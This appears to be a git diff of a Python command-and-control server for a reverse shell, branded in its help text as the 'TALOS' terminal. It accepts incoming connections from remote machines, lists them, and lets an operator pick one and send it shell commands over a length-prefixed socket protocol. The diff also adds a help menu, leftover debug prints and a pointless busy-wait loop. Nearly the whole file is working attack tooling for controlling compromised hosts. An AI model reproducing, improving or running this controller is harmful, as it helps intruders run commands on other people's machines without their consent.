@@ -1,29 +1,26 @@
 import socket
-#import sys
-import threading
-from queue import Queue
+from threading import Thread
 import time
-from colorama import Fore, Back, Style
+from colorama import Fore, Style, Back
 
-'''
-NUMBER_OF_THREADS = 2
-JON_NUMBER = [1, 2] # 1-> handling connection, 2-> chosing a client and sanding commands
-queue = Queue()
-'''
+allowedToWrite = True
 
 all_connection = []
 
 all_addresses = []
 
+CONST_LEN = 14
+
 def setFormat(data):
     i = str(len(data.encode()))
-    if(int(i) > 999999):
+    if(int(i) > 9999):
         return "### special code ###"
-    i = i.zfill(6)
+    i = i.zfill(CONST_LEN)
+    print(len(str(i).encode()))
     return i + data
 # need to encode the return
 
-#creating socket
+# creating socket
 def socket_create():
     try:
         global host
@@ -60,23 +57,29 @@ def accept_connection():
 
     while True:
         try:
+            i = 0
             conn, address = serverSock.accept()
-            conn.setblocking(1) # check
+            conn.setblocking(1)# check
             all_connection.append(conn)
             all_addresses.append(address)
+            while(not allowedToWrite):
+                i = i + 1
             print(Fore.GREEN + "\nConnection has been established to " + str(address) + Fore.RESET)
         except:
             print(Fore.RED + "Error accepting connections." + Fore.RESET)
 
-# interctibe promtfor sendding commands
+# interctibe promt for sending commands
 def start_master():
     while True:
         cmd = input(Fore.RESET + "master@ ")
+        allowedToWrite = True
         if cmd == 'list':
-            list_connections()#printing all connections, not created yet
+            list_connections()#printting all connections, not created yet
+        elif cmd == "help":
+            printHelp()
         elif 'connect' in cmd:
             try:
-                (conn, addr_index) = get_target(cmd) # returning the connection
+                (conn, addr_index) = get_target(cmd)#return the connection
             except:
                 continue
             if conn is not None:
@@ -85,13 +88,13 @@ def start_master():
             print(Fore.RED + "Command not recognized." + Fore.RESET)
 
 
-#Display all connection:
+# Display all connection:
 def list_connections():
     result = ''
     for i, conn in enumerate(all_connection):
         try:
             conn.send(str.encode(setFormat(' ')))
-            len = int(conn.recv(6).decode())
+            len = int(conn.recv(CONST_LEN).decode())
             conn.recv(len)
         except:
             del all_connection[i]
@@ -101,8 +104,6 @@ def list_connections():
     print(Fore.GREEN + " ---- Clients List ----- " + Fore.RESET)
     print(Fore.GREEN + result + Fore.RESET)
 #        result += str(i) + '  ' + str(all_connection[i][0]) + '  ' + str(all_connection[i][1]) +'\n'
-
-
 
 # Select a target client
 def get_target(cmd):
@@ -115,32 +116,28 @@ def get_target(cmd):
         conn = all_connection[target]
         print(Fore.GREEN + "You are now connected to " + str(all_addresses[target]) + Fore.RESET) # [0]
         print(Fore.GREEN + "------------------------------------------" + Fore.RESET)
-        #print("master> " + str(all_addresses[target][0]) + '> ', end="")
         return (conn, target)
     except:
         print(Fore.RED + "Not a valid selection." + Fore.RESET)
         return None
-
 
 # Ciinect wih remotes target client
 def send_target_commands(conn, target):
     while True:
         try:
             cmd = input("master@" + str(all_addresses[target]) + '$ ')
-            if cmd == 'quit':
-                print(Fore.GREEN + "You are now disconnecting from " + all_addresses[target] + Fore.RESET)
+            if cmd == "quit":
+                print(Fore.GREEN + "You are now disconnecting from " + str(all_addresses[target]) + Fore.RESET)
                 print(Fore.GREEN + "-----------------------------------" + Fore.RESET)
-                break
-            if len(str.encode(cmd)) > 0:
+                return
+            elif len(str.encode(cmd)) > 0:
                 conn.send(str.encode(setFormat(cmd)))
-                responseLen = int(conn.recv(6).decode())
+                responseLen = int(conn.recv(CONST_LEN).decode())
                 client_response = str(conn.recv(responseLen), "utf-8")
                 print(Fore.GREEN + client_response + Fore.RESET)#, end=""
         except:
-            print(Fore.RED +"Connection was lost." + Fore.RESET)
+            print(Fore.RED + " Connection was lost. " + Fore.RESET)
             break
-
-
 
 def threadFirstJob():
     socket_create()
@@ -151,19 +148,27 @@ def threadSecandJob():
     start_master()
 
 def handleThread():
-    t1 = threading.Thread(target=threadFirstJob)
+    print("crap")
+    t1 = Thread(target=threadFirstJob)
     t1.deamon = True # die when main program exit
-    t2 = threading.Thread(target=threadSecandJob)
+    t2 = Thread(target=threadSecandJob)
     t2.daemon = True
 
     t1.start() # Go
-
+    print("123")
     time.sleep(0.5)
 
     t2.start()
 
-
-
+def printHelp():
+    print(Style.BRIGHT + Back.BLUE + Fore.RED + "---- Welcome to TALOS terminal ----" + Back.RESET + Style.RESET_ALL)
+    print(Fore.CYAN + "Here at TALOS we give you the best reverse shell tool in the world")
+    print(Fore.RED + "Disclaimer: the entire terminal is space and case sensitive" + Fore.RESET)
+    print(Fore.CYAN + "Quick Manual: commands")
+    print("list: listing all available connection, by format[id : conn]")
+    print("help: printing help info")
+    print("quit: disconnecting from a client" + Fore.RESET + Style.RESET_ALL)
+    #print(Back.GREEN + "\n" + Back.RESET)
 
 def main():
     handleThread()
